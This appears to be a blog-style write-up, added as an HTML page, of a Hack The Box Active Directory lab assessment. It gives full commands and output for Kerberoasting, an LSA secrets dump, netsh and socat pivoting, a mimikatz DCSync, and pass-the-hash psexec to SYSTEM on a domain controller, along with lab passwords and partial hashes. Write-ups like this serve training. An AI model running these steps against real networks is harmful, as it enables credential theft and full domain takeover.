@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>HTB | AD Enumeration & Attacks — Skills Assessment Part I – Evert van Noort</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Mono:ital,wght@0,400;0,500;1,400&family=Lora:ital,wght@0,400;0,600;1,400&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #0e0f11;
+      --surface: #16181c;
+      --border: #252830;
+      --text: #d4d6db;
+      --muted: #6b7080;
+      --accent: #00ff9d;
+      --accent-dim: rgba(0,255,157,0.08);
+      --accent-mid: rgba(0,255,157,0.18);
+      --red: #ff4d6d;
+      --yellow: #ffd166;
+      --code-bg: #0a0c0f;
+    }
+
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    html { scroll-behavior: smooth; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Lora', Georgia, serif;
+      font-size: 17px;
+      line-height: 1.8;
+      min-height: 100vh;
+    }
+
+    header {
+      border-bottom: 1px solid var(--border);
+      padding: 2rem 0;
+      animation: fadeDown 0.6s ease both;
+    }
+
+    .header-inner {
+      max-width: 760px;
+      margin: 0 auto;
+      padding: 0 2rem;
+    }
+
+    .site-label {
+      font-family: 'Syne', sans-serif;
+      font-size: 0.75rem;
+      font-weight: 700;
+      letter-spacing: 0.18em;
+      text-transform: uppercase;
+      color: var(--muted);
+    }
+
+    .site-label span { color: var(--accent); }
+
+    main {
+      max-width: 760px;
+      margin: 0 auto;
+      padding: 4rem 2rem 6rem;
+    }
+
+    .meta {
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      gap: 0.5rem 1rem;
+      margin-bottom: 2.5rem;
+      animation: fadeUp 0.6s 0.1s ease both;
+    }
+
+    .tag {
+      font-family: 'Syne', sans-serif;
+      font-size: 0.7rem;
+      font-weight: 700;
+      letter-spacing: 0.14em;
+      text-transform: uppercase;
+      padding: 0.25rem 0.7rem;
+      border-radius: 2px;
+      border: 1px solid var(--accent);
+      color: var(--accent);
+    }
+
+    .meta-sep { color: var(--border); }
+
+    .meta-text {
+      font-family: 'Syne', sans-serif;
+      font-size: 0.8rem;
+      color: var(--muted);
+      letter-spacing: 0.04em;
+    }
+
+    h1 {
+      font-family: 'Syne', sans-serif;
+      font-size: clamp(2rem, 5vw, 2.8rem);
+      font-weight: 800;
+      line-height: 1.15;
+      letter-spacing: -0.02em;
+      color: #fff;
+      margin-bottom: 1rem;
+      animation: fadeUp 0.6s 0.15s ease both;
+    }
+
+    .subtitle {
+      font-family: 'Lora', serif;
+      font-style: italic;
+      font-size: 1.05rem;
+      color: var(--muted);
+      margin-bottom: 3.5rem;
+      padding-bottom: 3rem;
+      border-bottom: 1px solid var(--border);
+      animation: fadeUp 0.6s 0.2s ease both;
+    }
+
+    .content { animation: fadeUp 0.6s 0.3s ease both; }
+
+    .content p { margin-bottom: 1.6rem; color: var(--text); }
+
+    h2 {
+      font-family: 'Syne', sans-serif;
+      font-size: 0.72rem;
+      font-weight: 700;
+      letter-spacing: 0.2em;
+      text-transform: uppercase;
+      color: var(--accent);
+      margin: 3rem 0 1rem;
+      display: flex;
+      align-items: center;
+      gap: 0.6rem;
+    }
+
+    h2::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: var(--border);
+    }
+
+    pre {
+      background: var(--code-bg);
+      border: 1px solid var(--border);
+      border-left: 3px solid var(--accent);
+      border-radius: 4px;
+      padding: 1.25rem 1.5rem;
+      overflow-x: auto;
+      margin: 1.5rem 0;
+    }
+
+    pre code {
+      font-family: 'DM Mono', 'Fira Code', monospace;
+      font-size: 0.82rem;
+      line-height: 1.7;
+      color: #a8d8c0;
+      white-space: pre;
+    }
+
+    pre.terminal { background: #070809; border-left-color: var(--yellow); }
+    pre.terminal code { color: #b8c4b0; }
+
+    pre.url { border-left-color: var(--red); }
+    pre.url code { color: #f0a0b0; word-break: break-all; white-space: pre-wrap; }
+
+    .code-label {
+      font-family: 'Syne', sans-serif;
+      font-size: 0.65rem;
+      font-weight: 700;
+      letter-spacing: 0.15em;
+      text-transform: uppercase;
+      color: var(--muted);
+      margin-bottom: 0.4rem;
+      margin-top: 1.8rem;
+    }
+
+    code {
+      font-family: 'DM Mono', monospace;
+      font-size: 0.83em;
+      background: var(--accent-dim);
+      color: var(--accent);
+      padding: 0.1em 0.4em;
+      border-radius: 3px;
+    }
+
+    pre code { background: none; padding: 0; color: inherit; }
+
+    .callout {
+      background: var(--accent-dim);
+      border: 1px solid var(--accent-mid);
+      border-radius: 4px;
+      padding: 1rem 1.25rem;
+      margin: 1.5rem 0;
+      font-size: 0.93rem;
+      color: #a0e8c8;
+    }
+
+    .callout strong {
+      font-family: 'Syne', sans-serif;
+      font-size: 0.7rem;
+      letter-spacing: 0.15em;
+      text-transform: uppercase;
+      color: var(--accent);
+      display: block;
+      margin-bottom: 0.4rem;
+    }
+
+    footer {
+      border-top: 1px solid var(--border);
+      padding: 2rem;
+      text-align: center;
+      font-family: 'Syne', sans-serif;
+      font-size: 0.72rem;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      color: var(--muted);
+    }
+
+    @keyframes fadeDown {
+      from { opacity: 0; transform: translateY(-10px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(16px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    ::-webkit-scrollbar { width: 6px; height: 6px; }
+    ::-webkit-scrollbar-track { background: var(--bg); }
+    ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+
+    @media (max-width: 600px) {
+      main { padding: 2.5rem 1.25rem 4rem; }
+      h1 { font-size: 1.8rem; }
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <div class="header-inner">
+    <p class="site-label">Evert van Noort &mdash; <span>Security Writeups</span></p>
+  </div>
+</header>
+
+<main>
+
+  <div class="meta">
+    <span class="tag">Hack The Box</span>
+    <span class="tag">Active Directory</span>
+    <span class="meta-sep">·</span>
+    <span class="meta-text">Evert van Noort</span>
+    <span class="meta-sep">·</span>
+    <span class="meta-text">5 min read</span>
+    <span class="meta-sep">·</span>
+    <span class="meta-text">Just now</span>
+  </div>
+
+  <h1>AD Enumeration &amp; Attacks —<br>Skills Assessment Part I</h1>
+
+  <p class="subtitle">Continuing an external pentest through a PowerShell webshell, across domain-joined machines, all the way to Domain Admin.</p>
+
+  <div class="content">
+
+    <p>In this skills assessment we are instructed to continue an External Pentest and are provided with instruction to access the webshell and the given credentials to log in.</p>
+
+    <p>Anyway, Let's start with an NMAP scan:</p>
+
+    <div class="code-label">Nmap scan</div>
+    <pre class="terminal"><code>╭─[HQ🚀🌐192.168.1.66|10.10.15.28🔥]─(3v3r7@Athena)
+╰─>[👾]/home/3v3r7 $ sudo nmap 10.129.25.61 -sV -sC -Pn
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-27 16:32 +0100
+Nmap scan report for 10.129.25.61
+Host is up (0.059s latency).
+Not shown: 995 closed tcp ports (reset)
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft-IIS/10.0
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: -1m54s
+| smb2-time: 
+|   date: 2026-02-27T15:31:25
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 33.75 seconds</code></pre>
+
+    <p>Here we find the web page we need, open SMB ports and an access point for WinRM. For now we visit the webpage, and go to the <code>/uploads</code> directory and log in with the provided credentials. We are here presented with an antak.aspx powershell webshell. From here we can easily find the first flag on the indicated location.</p>
+
+    <div class="code-label">Flag 1</div>
+    <pre><code>PS> type C:/Users/Administrator/Desktop/flag.txt
+Jus&lt;SNIP&gt;rt3d!</code></pre>
+
+    <p>The location of the flag suggests that we already have high privileges, so for the moment we don't need to focus on privilege escalation. Uploading PowerView.ps1 via the UI is very straightforward and we can continue our enumeration.</p>
+
+    <p>We can list the users with the SPN set and find the identity of our target, svc_sql in this case.</p>
+
+    <div class="code-label">Enumerate SPNs with PowerView</div>
+    <pre><code>PS> Import-Module \PowerView.ps1; Get-DomainUser * -spn | select samaccountname, ServicePrincipalName
+
+samaccountname serviceprincipalname                       
+-------------- --------------------                       
+azureconnect   adfsconnect/azure01.inlanefreight.local    
+backupjob      backupjob/veam001.inlanefreight.local      
+krbtgt         kadmin/changepw                            
+sqltest        MSSQLSvc/DEVTEST.inlanefreight.local:1433  
+sqlqa          MSSQLSvc/QA001.inlanefreight.local:1433    
+sqldev         MSSQLSvc/SQL-DEV01.inlanefreight.local:1433
+svc_sql        MSSQLSvc/SQL01.inlanefreight.local:1433    
+sqlprod        MSSQLSvc/SQL02.inlanefreight.local:1433</code></pre>
+
+    <p>This user can be kerberoasted as follows:</p>
+
+    <div class="code-label">Kerberoast svc_sql</div>
+    <pre><code>PS> Import-Module \PowerView.ps1;Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat
+
+
+SamAccountName       : svc_sql
+DistinguishedName    : CN=svc_sql,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+ServicePrincipalName : MSSQLSvc/SQL01.inlanefreight.local:1433
+TicketByteHexStream  : 
+Hash                 : 
+
+$krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433*$498BBBC0B&lt;SNIP&gt;034F04601CD4B7CF16</code></pre>
+
+    <p>The obtained hash can be cracked with hashcat and rockyou.txt, giving us the password for svc_sql. With this password we can access the other Domain Joined Computer MS01 and obtain the flag on Administrator's desktop.</p>
+
+    <div class="code-label">Flag 2 — MS01</div>
+    <pre><code>PS> $pass = ConvertTo-SecureString 'lucky7' -AsPlainText -Force; 
+$cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\svc_sql', $pass); 
+Invoke-Command -ComputerName MS01.INLANEFREIGHT.LOCAL -Credential $cred -ScriptBlock {type C:\Users\Administrator\Desktop\flag.txt}
+spn$_r0&lt;SNIP&gt;_@n_0p3n_f1re</code></pre>
+
+    <p>Since we have access to MS01 we can connect it to a port on the computer hosting the webshell (WEB-WIN01). (We can also find the IP address of MS01 first with nslookup or a ping. This step is not necessary at this point, but can't be skipped altogether.)</p>
+
+    <p>Via the webshell we run the following netsh.exe command to connect to MS01. (netsh.exe is a native binary on windows machines, and is therefore slightly stealthier than uploading tools like Ligolo-Ng. In the future I will probably publish a similar writeup including Ligolo-Ng in the process.)</p>
+
+    <div class="code-label">Port forward SMB — MS01 → WEB-WIN01:4455</div>
+    <pre><code>PS> netsh.exe interface portproxy add v4tov4 listenport=4455 listenaddress=10.129.25.61 connectport=445 connectaddress=MS01</code></pre>
+
+    <p>We can now get an LSA dump and find the cleartext password for tpetty. Since we forward port 445 of MS01 to port 4455 on WEB-WIN01 we have to specify the port on which to perform the LSA dump.</p>
+
+    <div class="code-label">LSA dump via port proxy</div>
+    <pre class="terminal"><code>╭─[HQ🚀🌐192.168.1.66|10.10.15.28🔥]─(3v3r7@Athena)
+╰─>[👾]/home/3v3r7 $ nxc smb 10.129.25.61 --port 4455 -u svc_sql -p lucky7 --lsa
+
+SMB  10.129.53.108   4455   MS01    [*] Windows 10 / Server 2019 Build 17763 x64 (name:MS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False) 
+SMB  10.129.53.108   4455   MS01    [+] INLANEFREIGHT.LOCAL\svc_sql:lucky7 (Pwn3d!)
+SMB  10.129.53.108   4455   MS01    [+] Dumping LSA secrets
+SMB  10.129.53.108   4455   MS01    INLANEFREIGHT.LOCAL/tpetty:$DCC2$10240#tpetty#685decd67a67f5b6e45a182ed076d801: (2022-04-29 21:18:01)
+SMB  10.129.53.108   4455   MS01    INLANEFREIGHT.LOCAL/svc_sql:$DCC2$10240#svc_sql#acc5441d637ce6aabf3a3d9d4f8137fb: (2026-01-20 10:06:21)
+SMB  10.129.53.108   4455   MS01    INLANEFREIGHT.LOCAL/Administrator:$DCC2$10240#Administrator#9553faad97c2767127df83980f3ac245: (2022-04-20 10:25:07)
+SMB  10.129.53.108   4455   MS01    INLANEFREIGHT\MS01$:aes256-cts-hmac-sha1-96:94a19f3468c639ae9fe81ff2248763d718dbdb06cd9d10a7921e6fba69387370
+SMB  10.129.53.108   4455   MS01    INLANEFREIGHT\MS01$:aes128-cts-hmac-sha1-96:c183044cf57f7ba2865bd84cb1cc7814
+SMB  10.129.53.108   4455   MS01    INLANEFREIGHT\MS01$:des-cbc-md5:f27c2967a2cd54bf
+SMB  10.129.53.108   4455   MS01    INLANEFREIGHT\MS01$:plain_password_hex:4b427d59&lt;SNIP&gt;b6173622                                                                                                                                
+SMB  10.129.53.108   4455   MS01    INLANEFREIGHT\MS01$:aad3b435b51404eeaad3&lt;SNIP&gt;6a3ca60185eb3c590:::
+SMB  10.129.53.108   4455   MS01    INLANEFREIGHT\tpetty:Sup3rS3&lt;SNIP&gt;D0m@inU2eR
+SMB  10.129.53.108   4455   MS01    dpapi_machinekey:0x8dbe842a7352000be08&lt;SNIP&gt;953f7977a6363a69a9fe21d97ecd19
+SMB  10.129.53.108   4455   MS01    [+] Dumped 10 LSA secrets to /home/e&lt;SNIP&gt;2026-01-20_121356.cachedcan't be skipped, as</code></pre>
+
+    <p>We have credentials for 2 accounts on MS01, svc_sql and tpetty, so we continue by accessing MS01 over RDP. To do this we need to forward port 3389 from MS01 to port 8888 on WIN-WEB01.</p>
+
+    <div class="code-label">Port forward RDP — MS01 → WEB-WIN01:8888</div>
+    <pre><code>PS> netsh.exe interface portproxy add v4tov4 listenport=8888 listenaddress=10.129.25.112 connectport=3389 connectaddress=MS01
+PS> netsh.exe interface portproxy show all
+
+Listen on ipv4:             Connect to ipv4:
+
+Address         Port        Address         Port
+--------------- ----------  --------------- ----------
+10.129.25.112   4455                        445
+10.129.25.112   8888                        3389</code></pre>
+
+    <p>Now we can RDP into MS01 (via port 8888 on WIN-WEB01) as svc_sql (tpetty doesn't work) and upload and run SharpHound.exe. Unfortunately Bloodhound-Python does not work because we have to access the system via non-default ports. We open a terminal and run the following command to execute SharpHound.exe.</p>
+
+    <div class="code-label">Collect BloodHound data</div>
+    <pre><code>C:\Users\svc_sql.INLANEFREIGHT\Desktop>SharpHound.exe -c All</code></pre>
+
+    <p>After a few minutes we are left with a .zip that we copy to our attack machine and analyze it with bloodhound.</p>
+
+    <p>In bloodhound we see that our user tpetty can perform a DCsync attack (!) and under Windows abuse we find directions to perform this attack:</p>
+
+    <div class="callout">
+      <strong>BloodHound — Windows Abuse</strong>
+      You may perform a dcsync attack to get the password hash of an arbitrary principal using mimikatz:<br><br>
+      <code>lsadump::dcsync /domain:testlab.local /user:Administrator</code>
+    </div>
+
+    <p>We upload mimikatz in our RPD session to the Desktop of tpetty. We run powershell as tpetty and are able to run mimikatz with the required privileges. Doing so we find the NTLM-hash for the administrator:</p>
+
+    <div class="code-label">DCSync attack with mimikatz</div>
+    <pre><code>PS C:\Windows\system32> cd C:\Users\tpetty
+PS C:\Users\tpetty> whoami
+inlanefreight\tpetty
+PS C:\Users\tpetty> cd Desktop
+PS C:\Users\tpetty\Desktop> .\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:Administrator
+[DC] 'INLANEFREIGHT.LOCAL' will be the domain
+[DC] 'DC01.INLANEFREIGHT.LOCAL' will be the DC server
+[DC] 'Administrator' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : Administrator
+
+** SAM ACCOUNT **
+
+SAM Username         : Administrator
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000200 ( NORMAL_ACCOUNT )
+Account expiration   :
+Password last change : 4/11/2022 8:24:49 PM
+Object Security ID   : S-1-5-21-2270287766-1317258649-2146029398-500
+Object Relative ID   : 500
+
+Credentials:
+  Hash NTLM: 27dedb1dab&lt;SNIP&gt;1c66fba077da0
+    ntlm- 0: 27dedb1dab&lt;SNIP&gt;e1c66fba077da0
+...</code></pre>
+
+    <p>The ultimate goal is to run psexec as administrator on DC01, but this target is not reachable yet. To do that we apply the same netsh.exe method to connect an SMB port over an arbitraty port on WIN-WEB01. In the webshell we run the following command to establish the connection.</p>
+
+    <div class="code-label">Port forward DC01 SMB → WEB-WIN01:4454</div>
+    <pre><code>netsh.exe interface portproxy add v4tov4 listenport=4454 listenaddress=10.129.17.102 connectport=445 connectaddress=172.16.6.3</code></pre>
+
+    <p>This port is a problem for impacket since this is not a default SMB port (139 or 445). Fortunately we have another machine at our disposal: our own attack machine. Using socat we can connect port 4454 on WIN-WEB01 to port 445 of our attack machine.</p>
+
+    <div class="code-label">Socat tunnel — attack machine:445 → WEB-WIN01:4454</div>
+    <pre class="terminal"><code>╭─[HQ🚀🌐192.168.1.66|10.10.15.28🔥]─(3v3r7@Athena)
+╰─>[👾]/home/3v3r7 $ sudo socat -d -d TCP-LISTEN:445,fork TCP:10.129.17.102:4454</code></pre>
+
+    <p>We can then attack our own SMB port that forwards the traffic to a port that impacket would normally not allow. We can then use psexec and find the final flag.</p>
+
+    <div class="code-label">PSExec as Administrator on DC01</div>
+    <pre class="terminal"><code>╭─[HQ🚀🌐192.168.1.66|10.10.15.28🔥]─(3v3r7@Athena)
+╰─>[👾]/home/3v3r7 $ psexec.py -hashes :27dedb1dab4d8545c6e1c66fba077da0 administrator@127.0.0.1
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Requesting shares on 127.0.0.1.....
+
+&lt;SNIP&gt;
+
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+
+C:\Windows\system32> type c:\Users\Administrator\Desktop\flag.txt
+r3plicat1on_m@st3r!</code></pre>
+
+  </div>
+</main>
+
+<footer>
+  &copy; Evert van Noort &mdash; Security Writeups
+</footer>
+
+</body>
+</html>
